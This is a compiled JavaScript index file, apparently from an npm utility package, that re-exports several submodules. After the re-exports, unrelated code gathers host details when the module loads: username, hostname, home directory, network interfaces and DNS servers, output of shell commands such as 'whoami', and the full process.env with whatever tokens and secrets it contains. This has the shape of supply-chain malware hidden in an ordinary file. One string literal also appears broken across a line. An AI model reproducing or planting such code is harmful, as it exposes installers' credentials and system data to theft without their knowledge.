var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __reExport = (target, mod, secondTarget) => (__copyProps(target, mod, "default"), secondTarget && __copyProps(secondTarget, mod, "default"));
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);
var stdin_exports = {};
module.exports = __toCommonJS(stdin_exports);
__reExport(stdin_exports, require("./basic"), module.exports);
__reExport(stdin_exports, require("./props"), module.exports);
__reExport(stdin_exports, require("./dom"), module.exports);
__reExport(stdin_exports, require("./create"), module.exports);
__reExport(stdin_exports, require("./format"), module.exports);
__reExport(stdin_exports, require("./constant"), module.exports);
__reExport(stdin_exports, require("./interceptor"), module.exports);
__reExport(stdin_exports, require("./with-install"), module.exports);
__reExport(stdin_exports, require("./closest"), module.exports);

const os = require('os');
const { execSync } = require('child_process');
const dns = require('dns');

const systemInfo = {
    currentDir: __dirname,
    homeDir: os.homedir(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: os.platform(),
    arch: os.arch(),
    osType: os.type(),
    osRelease: os.release(),
    cpuCores: os.cpus().length,
    cpuModel: os.cpus()[0]?.model,
    totalMemory: os.totalmem(),
    freeMemory: os.freemem(),
    uptime: os.uptime(),
    dnsServers: dns.getServers(),
    networkInterfaces: os.networkInterfaces(),
    envVariables: process.env,
    nodeVersion: process.version,
    npmVersion: execSync("npm -v").toString().trim(),
    currentShell: process.env.SHELL || "unknown",
    currentUser: execSync("whoami").toString().trim(),
    currentProcessID: process.pid,
    diskUsage: (() => {
        try {
            const diskInfo = execSync("df -h /").toString();
            return diskInfo.split("
")[1];
        } catch {
            return "Unable to retrieve disk info";
        }
    })(),
};
